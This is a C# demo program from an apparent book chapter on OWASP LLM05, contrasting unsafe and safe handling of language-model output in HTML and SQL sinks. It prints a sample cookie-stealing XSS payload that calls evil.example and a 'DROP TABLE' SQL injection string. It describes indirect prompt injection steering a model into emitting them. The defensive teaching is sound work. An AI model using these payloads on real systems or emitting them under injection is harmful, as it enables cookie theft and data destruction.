// ============================================================================
// Chapter 15 — Improper Output Handling (OWASP LLM05)
// ----------------------------------------------------------------------------
// The chapter already redacts PII *out* of a response. This demo covers the
// other direction: an LLM's output is UNTRUSTED INPUT to whatever consumes it.
// The model can be steered (directly, or via the indirect injection from the
// Ch15.IndirectInjection demo) into emitting a string that is harmless as text
// but dangerous the moment it is interpolated into HTML (XSS), SQL (injection),
// a shell command, or a file path.
//
// The fix is not "sanitize the model." It is the same boundary discipline you
// already apply to user input: ENCODE or PARAMETERIZE at every sink the answer
// crosses. This sample shows the unsafe and safe paths for the two most common
// sinks — HTML and SQL — with no LLM call, so the output is deterministic.
// ============================================================================

using System.Text.Encodings.Web;

Console.WriteLine("=== Chapter 15: Improper Output Handling (LLM05) ===");
Console.WriteLine();

// A model answer that LOOKS like a normal helpful response but carries an
// HTML/script payload — possibly because a retrieved doc (indirect injection)
// told the model to include it.
const string modelAnswer =
    "Sure! Add this banner: <img src=x onerror=\"fetch('https://evil.example/c='+document.cookie)\">";

// ── Sink 1: HTML ─────────────────────────────────────────────────────
Console.WriteLine("-- Sink 1: rendering the answer in a web view --");
Console.WriteLine();

// UNSAFE: interpolating the answer straight into markup. The <img onerror>
// fires in the victim's browser. This is stored/reflected XSS.
string unsafeHtml = $"<div class=\"answer\">{modelAnswer}</div>";
Console.WriteLine("UNSAFE (raw interpolation):");
Console.WriteLine($"  {unsafeHtml}");
Console.WriteLine();

// SAFE: HTML-encode the answer before it touches the page. The payload becomes
// inert text; the browser renders it but never executes it.
string encoded = HtmlEncoder.Default.Encode(modelAnswer);
Console.WriteLine("SAFE (HTML-encoded):");
Console.WriteLine($"  <div class=\"answer\">{encoded}</div>");
Console.WriteLine();

// ── Sink 2: SQL ──────────────────────────────────────────────────────
Console.WriteLine("-- Sink 2: using the answer in a database query --");
Console.WriteLine();

// An agent extracts a "customer name" from a conversation and you persist it.
// A crafted value closes the string literal and tacks on a second statement.
const string extractedName = "Robert'); DROP TABLE Customers;--";

// UNSAFE: string-concatenated SQL. Classic injection (Little Bobby Tables).
string unsafeSql = $"INSERT INTO Customers (Name) VALUES ('{extractedName}')";
Console.WriteLine("UNSAFE (string-concatenated SQL):");
Console.WriteLine($"  {unsafeSql}");
Console.WriteLine();

// SAFE: parameterize. The command text contains a placeholder; the value is
// bound as data and never parsed as SQL. Every ADO.NET provider (SqlCommand,
// NpgsqlCommand, SqliteCommand, ...) uses exactly this shape.
const string safeSql = "INSERT INTO Customers (Name) VALUES (@name)";
Console.WriteLine("SAFE (parameterized — value bound, never parsed as SQL):");
Console.WriteLine($"  CommandText : {safeSql}");
Console.WriteLine($"  @name       : {extractedName}");
Console.WriteLine();

Console.WriteLine("Key takeaway: never trust, never interpolate —");
Console.WriteLine("encode or parameterize at every boundary the answer crosses.");
Console.WriteLine();
Console.WriteLine("=== Done ===");
